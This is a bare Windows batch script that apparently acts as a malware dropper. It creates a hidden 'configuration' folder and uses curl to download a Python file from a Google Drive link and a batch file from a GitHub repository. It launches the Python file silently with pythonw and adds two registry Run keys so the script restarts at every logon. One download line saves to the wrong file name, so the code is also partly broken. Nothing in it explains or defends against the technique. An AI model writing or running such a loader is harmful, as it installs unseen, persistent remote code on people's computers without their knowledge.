@echo off

:conf
IF EXIST "C:\Users\%USERNAME%\configuration\" (
	goto hote
) ELSE (
	mkdir "C:\Users\%USERNAME%\configuration"
	goto hote
)

:hote
IF EXIST "C:\Users\%USERNAME%\configuration\wxappx.pyw" (
	start "" pythonw "C:\Users\%USERNAME%\configuration\wxappx.pyw"
	goto rewind_1
) ELSE (
	curl -L -o "C:\Users\%USERNAME%\configuration\wxappx.pyw" "https://drive.usercontent.google.com/download?id=1BWI_g0rYHTo2byBmz1ASoc6a3aH9tLSl&export=download&authuser=0&confirm=t&uuid=68837b1c-e076-4f9e-bfb0-764fb92212f6&at=AIrpjvMjI7TtfYSOANWXDDcgxurH:1736532294502"
		start "" pythonw "C:\Users\%USERNAME%\configuration\wxappx.pyw"
	goto rewind_1
)

:rewind_1
IF EXIST "C:\Users\%USERNAME%\configuration\rewind.bat" (
	goto rewind_2
) ELSE (
	curl -L -o "C:\Users\%USERNAME%\configuration\wxappx.pyw" "https://raw.githubusercontent.com/Unyther/woukpakxpoux/main/rewind.bat"
	reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v RewindConfig /t REG_SZ /d "C:\Users\%USERNAME%\configuration\rewind.bat" /f
	goto rewind_2
)

:rewind_2
IF EXIST "C:\Users\%USERNAME%\rewind.bat" (
	goto end
) ELSE (
	COPY "C:\Users\%USERNAME%\configuration\rewind.bat" "C:\Users\%USERNAME%\"
	reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Rewind /t REG_SZ /d "C:\Users\%USERNAME%\rewind.bat" /f
	goto end
)

:end
exit /B 0